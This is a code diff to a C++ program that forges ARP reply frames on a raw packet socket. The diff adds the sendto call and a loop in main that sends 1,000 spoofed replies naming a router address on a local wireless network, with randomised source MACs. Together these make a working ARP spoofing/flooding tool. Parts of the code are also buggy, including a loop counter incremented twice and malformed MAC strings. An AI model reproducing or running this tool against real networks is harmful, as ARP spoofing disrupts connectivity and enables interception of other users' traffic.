@@ -27,7 +27,7 @@ class arpreply: public infoHost{
 
 		 char *convertMac(char *macaddr){
 			static char mac[6];
-			char str[16];
+			char str[17];
 			strcpy(str,macaddr);
 			char *p;
 			p=strtok(str, ":");
@@ -35,33 +35,34 @@ class arpreply: public infoHost{
 			for(int i=0;i<6;i++){
 				char c=std::stoi(p,0,16);
 				mac[i]=c;
+				//printf("%x\n",c);
 				p=strtok(NULL,":");
 			}
 			return mac;	
 		}
 		char *randomMac(char *macaddr){
 			static char mac[6];
+			char *temp;
 			srand(time(NULL));
 			double min=0;
-			double max=255;
+			double max=65536;
 			
 			for(int i=0 ; i<6 ; i++){
 				int x=(max-min)*rand()/(RAND_MAX + 1.0) + min;
-				mac[i]=htons(x);
-				printf("~~%x\n",htons(x));
+				int y=htons(x);
+				mac[i++]=y/256;
+				mac[i]=y%256;	
 			}
-
-			
 			return mac;
 		}
 		
 	
 	public:
-		arpreply(char *interface,char *dstIP, char *dstMac ,char *srcIP ,char *srcMac):infoHost(interface){
+		arpreply(char *interface,char *srcIP ,char *srcMac, char *dstIP, char *dstMac):infoHost(interface){	
 			
 					
 			strcpy(this->interface,interface);
-			if(send=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL))<0){
+			if((send=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL)))<0){
 				perror("failed to creat socket");
 				exit(1);
 			}
@@ -74,11 +75,6 @@ class arpreply: public infoHost{
 				exit(1);
 			}
 		
-		//convertMac(dstMac);
-			for(int i=0;i<6;i++){
-				printf("--%x\n",convertMac(dstMac)[i]);
-			}
-		//	printf("%x\n",convertMac(dstMac));
 			memcpy(this->dstMAC,convertMac(dstMac),6);
 			memcpy(this->srcMAC,randomMac(srcMac),6);
 		}
@@ -89,7 +85,8 @@ class arpreply: public infoHost{
 				
 			uint8_t ethernet2[60];
 			struct sockaddr_ll device;	
-			
+			int bytes;
+
 			memcpy(ethernet2,this->dstMAC,6);
 			memcpy(ethernet2+6,this->srcMAC,6);
 			ethernet2[12]=0x08;
@@ -112,7 +109,11 @@ class arpreply: public infoHost{
 			device.sll_ifindex=if_nametoindex(interface);
 			memcpy(device.sll_addr,getMac(),6*sizeof(uint8_t));
 			device.sll_halen=htons(6);
-
+			
+			if((bytes=sendto(send,ethernet2,sizeof(ethernet2),0,(struct sockaddr *)&device,sizeof(device)))<=0){
+				perror("sendto error");
+				exit(1);
+			}
 
 		}
 	
@@ -120,14 +121,14 @@ class arpreply: public infoHost{
 };
 
 int main(void ){
-	char *senderIP="192.168.4.212";
+	char *senderIP="192.168.4.213";
 	char *senderMAC="b8:27:eb:39:b8:f";
 	char *routerIP="192.168.4.1";
-	char *routerMAC="c8:d3:a3:68:33:d2";
+	char *routerMAC="c8:d3:a3:68:33:d2:";
 
 	arpreply s("wlan0",senderIP,senderMAC,routerIP,routerMAC);
-	
-	
-
+	for (int i=0;i<1000;i++){
+		s.sendreply();	
+	}
 	return 0;
 }
